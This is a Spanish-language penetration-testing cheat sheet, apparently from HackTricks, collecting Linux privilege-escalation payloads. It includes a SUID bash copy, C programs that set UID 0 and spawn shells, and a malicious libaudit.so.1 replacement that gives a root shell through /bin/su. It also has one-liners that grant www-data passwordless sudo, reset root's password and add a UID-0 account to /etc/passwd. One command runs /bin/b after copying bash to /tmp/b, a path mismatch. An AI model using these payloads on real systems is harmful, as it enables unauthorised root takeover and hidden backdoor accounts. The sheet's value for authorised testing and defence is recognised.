# Payloads para ejecutar

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` habilita el modo privilegiado: cuando Bash se inicia con distintos ID reales y efectivos, no restablece el ID efectivo al ID real. El shell resultante todavía depende de las credenciales existentes del proceso que lo invoca.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` cambia los ID real, efectivo y guardado cuando está permitido, mientras que `setuid` cambia el ID efectivo y también puede establecer los ID real y guardado para un caller privilegiado. `execve` reemplaza la imagen del proceso actual por el programa solicitado.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Estos ejemplos omiten las comprobaciones del valor de retorno; ambas llamadas de credenciales pueden fallar incluso para UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Sobrescribir un archivo para escalar privilegios

### Archivos comunes

Estos son archivos e interfaces comunes de control de privilegios locales: `/etc/passwd` almacena registros de cuentas de siete campos, `/etc/shadow` almacena datos opcionales de contraseñas cifradas, `sudoers` define los privilegios de sudo y etiquetas como `NOPASSWD`, y el endpoint predeterminado del daemon de Docker es un socket Unix en `/var/run/docker.sock`; el acceso a ese socket puede otorgar control a nivel root sobre su host.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Añadir un usuario con contraseña a _/etc/passwd_
- Cambiar la contraseña dentro de _/etc/shadow_
- Añadir un usuario a sudoers en _/etc/sudoers_
- Abusar de Docker mediante el docker socket, normalmente en _/run/docker.sock_ o _/var/run/docker.sock_

### Sobrescribir una library

Comprueba qué shared libraries utiliza un binario; en este ejemplo, inspecciona `/bin/su` con `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` informa de las dependencias de objetos compartidos, mientras que el dynamic linker utiliza los metadatos ELF y sus reglas de búsqueda para cargarlas en tiempo de ejecución.<sup>[[9]](#references)[[10]](#references)</sup>

Para inspeccionar un candidato, utiliza `objdump -T` para mostrar la tabla de símbolos dinámica de `su` y filtra los nombres de auditoría.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` y `audit_log_acct_message` son funciones de libaudit; `audit_fd` aparece como un objeto de datos definido en la sección `.bss` de `su` en esta salida.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Una biblioteca de reemplazo debe exportar definiciones compatibles para los símbolos no definidos que el loader resuelve; los ABI incompatibles de funciones/datos aún pueden hacer que el proceso falle cuando esos símbolos se reubican o se llaman.<sup>[[10]](#references)[[11]](#references)</sup>

El atributo `constructor` de GCC hace que `inject` se llame automáticamente antes de `main` en los targets compatibles.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Si el reemplazo se carga correctamente mediante un proceso privilegiado **`/bin/su`**, este constructor puede iniciar **`/bin/bash`** con los privilegios de dicho proceso; el resultado exacto depende del entorno.<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

¿Puedes hacer que root ejecute algo?

`sudoers` utiliza la etiqueta `NOPASSWD` en las entradas de política, `chpasswd` lee pares `usuario:contraseña` desde la entrada estándar, y `/etc/passwd` utiliza siete campos de cuenta separados por dos puntos; los siguientes ejemplos asumen que los archivos relevantes son escribibles por el proceso que los ejecuta.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data a sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Cambiar la contraseña de root**
```bash
echo "root:hacked" | chpasswd
```
### Añadir un nuevo usuario root a /etc/passwd

El payload final depende de un target que acepte el hash `crypt` generado: `mkpasswd -m sha-512` de Debian corresponde a SHA-512 crypt (`$6$`), mientras que `passwd -1 -salt` de OpenSSL utiliza el algoritmo BSD basado en MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [El builtin Set (Manual de referencia de Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — página del manual de Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — página del manual de Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — página del manual de Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — páginas del manual de Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Proteger el socket del daemon de Docker](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — documentación de Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — página del manual de Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (Utilidades binarias de GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — páginas del manual de Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — páginas del manual de Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — páginas del manual de Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Atributos comunes (Uso de la colección de compiladores GNU)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — fuentes de Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — documentación de OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
